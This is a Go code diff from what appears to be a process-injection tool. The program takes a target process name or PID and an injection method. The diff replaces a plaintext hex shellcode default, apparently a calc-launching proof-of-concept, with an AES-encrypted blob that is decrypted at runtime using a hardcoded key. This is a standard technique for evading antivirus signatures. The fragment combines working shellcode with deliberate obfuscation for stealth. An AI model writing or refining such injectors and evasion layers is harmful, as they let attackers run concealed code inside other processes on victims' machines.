@@ -10,7 +10,8 @@ func main() {
    var process_name string;
    var hex_payload string;
    flag.StringVar(&process_name, "n", "", "Process name")
-   flag.StringVar(&hex_payload, "h", "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", "Hexadecimal payload")
+   var payload_str string = GetAESDecrypted_aux("BbZNVwAr3ErnvDSnfcgX70AiGN6QQ+JvU2btTCYZzxzyaw4Y3eqb1hFKzBmDwaKX4KMkddU0s++RZV9l4FywSodtuZiS94Ekic3y7f5xpykS134W6D0dpyUAQBmneB7s/v25yCnAWcJMSkL10FvDMTjL1futJWMkkMoDsyGV5PVuNAp4zyMhTNrRLjej6RHdwcokIpBBEgPwZWFhNWLOpldKT29f589Z3sURW2HowiEJwZb1q89K92vND6fIGlyr+TdaCwjKpE23q2dO+/stSTb2lW6c52yiK38TBcNlGRE=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
+   flag.StringVar(&hex_payload, "h", payload_str, "Hexadecimal payload")
    pid :=  flag.Int("p", 0, "Process ID (PID)")
    method :=  flag.Int("m", 0, "Method for injection")
    flag.Parse()
